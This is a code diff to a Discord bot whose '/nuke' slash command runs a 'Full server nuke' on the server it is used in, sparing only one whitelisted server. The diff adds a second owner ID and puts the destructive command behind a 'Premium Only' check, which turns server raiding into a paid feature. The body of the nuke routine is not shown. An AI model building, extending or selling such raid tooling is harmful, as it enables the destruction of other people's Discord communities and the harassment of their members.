@@ -121,7 +121,7 @@ async def nuke_guild(guild, custom_message=None, custom_channel_name=None):
 # Main entry point
 token = environ.get('DISCORD_BOT_TOKEN')
 prefix = environ.get('DISCORD_PREFIX', '.')
-OWNER_IDS = {1443051529190772768, 980}
+OWNER_IDS = {1443051529190772768, 980129921596788736}
 
 class MyBot(commands.Bot):
     def __init__(self):
@@ -438,10 +438,12 @@ async def setup_support_slash(interaction: discord.Interaction, role: discord.Ro
     
     await interaction.response.send_message(f"✅ Support Setup Complete!\nStaff Role: {role.mention}\nCategory: {category.name}", ephemeral=True)
 
-@client.tree.command(name="nuke", description="Full server nuke (Free - uses default message)")
+@client.tree.command(name="nuke", description="Full server nuke (Premium Only)")
 async def nuke_slash(interaction: discord.Interaction):
     if interaction.guild_id == WHITELISTED_SERVER_ID:
         return await interaction.response.send_message("❌ This server is protected from nuking!", ephemeral=True)
+    if not is_premium(interaction.user.id) and not await client.is_owner(interaction.user):
+        return await interaction.response.send_message("❌ Premium Only!", ephemeral=True)
     await interaction.response.send_message("🚀 Nuke Started!", ephemeral=True)
     await nuke_guild(interaction.guild)
 
